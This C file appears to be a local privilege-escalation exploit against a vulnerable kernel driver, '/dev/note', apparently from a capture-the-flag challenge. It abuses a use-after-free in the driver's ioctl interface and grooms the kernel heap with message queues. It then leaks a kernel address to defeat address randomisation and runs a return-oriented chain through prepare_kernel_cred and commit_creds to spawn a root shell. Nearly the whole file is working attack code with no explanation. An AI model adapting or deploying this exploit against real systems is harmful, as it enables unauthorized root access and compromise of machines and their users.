#define _GNU_SOURCE
#include <stdio.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sched.h>
#include <errno.h>

#define free_note  0xc12ed002
#define alloc_note 0xc12ed001
#define write_note 0xc12ed003
#define read_note  0xc12ed004

void print_words(const unsigned *data, unsigned n) {
    for (unsigned i = 0; i < n; ++i) {
        printf("0x%x ", data[i]);
        if ((i + 1) % 4 == 0) {
            printf("\n");
        }
    }
    if (n % 4 != 0) {
        printf("\n"); 
    }
}

void print_qwords(const unsigned long *data, unsigned n) {
    for (unsigned i = 0; i < n; ++i) {
        printf("0x%lx ", data[i]);
        if ((i + 1) % 4 == 0) {
            printf("\n");
        }
    }
    if (n % 4 != 0) {
        printf("\n"); 
    }
}

struct mymsg {
    long type;
    char data[0x50];
};

volatile unsigned long *page;

unsigned long user_cs, user_ss, user_sp, user_rflags;

void save_state(void)
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3;\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_sp)
        :
        : "memory");
    printf("%lx %lx %lx %lx\n", user_cs, user_ss, user_rflags, user_sp);
}

static void pwn() {
	system("/bin/sh");
}

unsigned long image_base = 0;
#define ADJUST_PTR(addr) (addr - 0xffffffff81000000UL + image_base)

int stomp() {
    unsigned long push_pop_rsp = ADJUST_PTR(0xffffffff8136fa8bUL);
    unsigned long add_rsp = ADJUST_PTR(0xffffffff81026c48); //: add rsp, 0x100; pop rbx; pop rbp; ret; 
    unsigned long prepare_kernel_cred = ADJUST_PTR(0xffffffff81069e00);
    unsigned long commit_creds = ADJUST_PTR(0xffffffff81069c10);
    unsigned long pop_rdi_ret = ADJUST_PTR(0xffffffff81047823); //: pop rdi; ret 0; 
    unsigned long push_rax_pop_rdx = ADJUST_PTR(0xffffffff811ead82); //: push rax; pop rdx; ret; 
    unsigned long or_rdi_rax = ADJUST_PTR(0xffffffff811d3027); //: or rdi, rax; test esi, esi; jne 0x1d38b8; mov eax, 0xffffffff; ret;
    unsigned long pop_rsi_ret = ADJUST_PTR(0xffffffff81313f7e); // : pop rsi; ret; 
    unsigned long inf_loop = ADJUST_PTR(0xffffffff81000218);
	unsigned long mov_qword_ptr = ADJUST_PTR(0xffffffff81550bc8); // mov qword ptr [r11], rdi; ret; 
	unsigned long pop_r11_ret = ADJUST_PTR(0xffffffff81500787); //: pop r11; pop r12; pop rbp; ret; 
	unsigned long modprobe = ADJUST_PTR(0xffffffff81c2c540);
	unsigned long usleep_range = ADJUST_PTR(0xffffffff81561f70);

    unsigned off = 1 + (0x100 / 8) + 3;
    page[off++] = pop_rdi_ret;
    page[off++] = 0;
    page[off++] = prepare_kernel_cred;
    page[off++] = pop_rsi_ret;
    page[off++] = 0;
    page[off++] = pop_rdi_ret;
    page[off++] = 0;
    page[off++] = or_rdi_rax;
    page[off++] = commit_creds;

    page[off++] = ADJUST_PTR(0xffffffff81600a4a);
    page[off++] = 0;
    page[off++] = 0;
    page[off++] = pwn;
    page[off++] = user_cs;
    page[off++] = user_rflags;
    page[off++] = user_sp;
    page[off++] = user_ss;
    //page[off++] = inf_loop;
	unsigned long i = 0;
    while(i < 0x10000000) {
		//memset(page, 0, 32);
        //page[0xc] = push_pop_rsp;
        page[96 / 8] = push_pop_rsp;
        //page[96 / 8] = 0xdeadbeef;
        page[88 / 8] = ADJUST_PTR(0xffffffff810001cc);
        page[104 / 8] = 0;
        page[1] = add_rsp;
		++i;
    }
    return 0;
}

#define fail(op, msg) \
do { \
    if (op) { \
        printf("Error: %s. %m. Err id: %d\n", msg, errno); \
        exit(-1); \
    } \
} while (0);

int main() {
    int dev;
    int r;
    unsigned char bigbuf[0x80];
    unsigned long *big_u8 = (unsigned long *)&bigbuf[0];

    void *leet = (unsigned long*)mmap(0x1337000, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    fail(leet== MAP_FAILED, "Failed to map page");
	memset(leet, 0, 0x1000);

    save_state();

    int q_id = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
    fail(q_id < 0, "Cannot create ipc queue");

#define send_msg(id, c) \
    do { \
    struct mymsg msg; \
    memset(&msg, c, sizeof(msg)); \
    msg.type = id; \
    r = msgsnd(q_id, &msg, sizeof(msg.data), IPC_NOWAIT); \
    if (r < 0) { \
        printf("Failed to send msg: %m\n"); \
    } \
    printf("Sent msg\n"); \
    } while(0)

#define recv_msg(id) \
    do { \
    struct mymsg msg; \
    r = msgrcv(q_id, &msg, sizeof(msg.data), id, MSG_NOERROR | IPC_NOWAIT); \
    if (r < 0) { \
        printf("Failed to recv msg: %m\n"); \
        exit(-1); \
    } \
    printf("got msg\n"); \
    print_words(msg.data, sizeof(msg.data) / 4U); \
    } while(0)

#define sync() \
do { \
    getc(stdin); \
} while (0)

    unsigned char stack[0x2000];
    unsigned char stack2[0x2000];
    unsigned long SPECIAL = 0x415b0000;
    page = (unsigned long*)mmap(SPECIAL, 0x4000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    fail(page == MAP_FAILED, "Failed to map page");
    memset(page, 0, 4096);

    void *tmp = mmap(SPECIAL - 0x2000, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    fail(tmp== MAP_FAILED, "Failed to map page");
    memset(tmp, 0, 0x2000);

    // Fill up slabs
    for (int i = 0; i < 154; ++i) {
        send_msg(1337, 'A');
    }

    dev = open("/dev/note", O_RDWR);
    fail(dev < 0, "fail open");

    unsigned t1 = 0xabab;
    unsigned t2 = 0x2d2d;
    unsigned t3 = 0x3737;
    unsigned t4 = 0x7878;
    send_msg(t1, 'B');
    send_msg(t2, 'C');
    send_msg(t3, 'D');
    send_msg(t4, 'E');

    //recv_msg(t1);
    recv_msg(t2);
    recv_msg(t4);
    recv_msg(t3);

    size_t sz = 0x80;
    r = ioctl(dev, alloc_note, &sz);
    fail(r < 0, "Failed to create note");

    {
        memset(bigbuf, '1', 0x80);
        unsigned long cmd_data[2] = {0x80, &bigbuf};
        r = ioctl(dev, write_note, &cmd_data);
        fail(r < 0, "Failed to write note");
    }

    // At this point, both should point 
    r = ioctl(dev, free_note, &sz);
    fail(r < 0, "Failed to free note");

    recv_msg(t1);

    r = ioctl(dev, alloc_note, &sz);
    fail(r < 0, "Failed to create note");

    send_msg(0xaaaa, 'W');
    send_msg(0xbbbb, 'Z');

    r = socket(22, AF_INET, 0);
    {
        unsigned long cmd_data[2] = {0x80, &bigbuf};
        r = ioctl(dev, read_note, &cmd_data);
        fail(r < 0, "Failed to read note\n");
    }

    print_qwords(bigbuf, 0x80 / 8);
    unsigned long leak = big_u8[3];
    image_base = leak - 0x60160ULL;
    printf("Leak is 0x%lx. Base is 0x%lx\n", leak, image_base);

    int tid = clone(stomp, &stack[0x1000], CLONE_IO | CLONE_VM, NULL);
    fail(tid < 0, "Failed to create thread");

    r = ioctl(dev, free_note, &sz);
    fail(r < 0, "Failed to free note");

    // Fill up slabs
    for (int i = 0; i < 10; ++i) {
        send_msg(7070, '?');
    }

    {
        send_msg(0x10, 'x');
        send_msg(0x11, 'y');
        send_msg(0x12, 'z');
        send_msg(0x13, 'w');

        recv_msg(0x11);
        recv_msg(0x13);
        recv_msg(0x12);

        // This should corrupt ptr in msg 0x13 to point to msg 0x10
        r = ioctl(dev, alloc_note, &sz);
        fail(r < 0, "Failed to create note");
        {
            unsigned long cmd_data[2] = {0x80, &bigbuf};
            memset(bigbuf, '6', 0x80);
            r = ioctl(dev, write_note, &cmd_data);
            fail(r < 0, "Failed to write note\n");
        }

        r = ioctl(dev, free_note, &sz);
        fail(r < 0, "Failed to free note");

        recv_msg(0x10);

        // Should point to 0x10 msg
        r = ioctl(dev, alloc_note, &sz);

        send_msg(0x100, 'R');
        send_msg(0x110, '<');

#if 1
        {
            memset(bigbuf, 0x0, 0x80);
            big_u8[0] = (unsigned long)page;
            unsigned long cmd_data[2] = {0x80, &bigbuf};
            r = ioctl(dev, write_note, &cmd_data);
            if (r < 0) {
                printf("Failed to write note: %m\n");
                return -1;
            } 
        }
#endif

        send_msg(0x110, '<');

        r = socket(22, AF_INET, 0);

		printf("WTF");
		exit(-1);
    }
    return 0;
}
